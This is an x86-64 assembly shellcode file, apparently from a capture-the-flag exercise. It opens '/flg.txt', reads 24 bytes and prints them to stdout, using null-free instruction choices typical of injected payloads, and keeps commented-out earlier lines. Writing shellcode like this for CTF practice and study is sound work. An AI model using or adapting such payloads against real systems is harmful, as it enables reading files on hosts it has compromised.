global _start

section .text
_start:
    ; push './flg.txt\x00'
    ;push 0              ; push NULL string terminator
    xor rdi, rdi
    push rdi
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    ;xor rax, rax
    mov al, 2
    ; mov rax, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    ;mov rsi, 0          ; set O_RDONLY flag
    xor rsi, rsi
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    ; mov rax, 0          ; read syscall number
    xor rax, rax
    ;xor rdx, rdx
    mov dl, 24
    ;mov rdx, 24         ; size to read
    syscall

    ; write output
    ;xor rax, rax
    mov al, 1
    ; mov rax, 1          ; write syscall
    xor rdi, rdi
    mov dil, 1
    ; mov rdi, 1          ; set fd to stdout
    ;xor rdx, rdx
    mov dl, 24
    ;mov rdx, 24         ; size to read
    syscall

    ; exit
    ; do we really care about a nice exit?
    ;mov rax, 60
    ;mov rdi, 0
    ;syscall

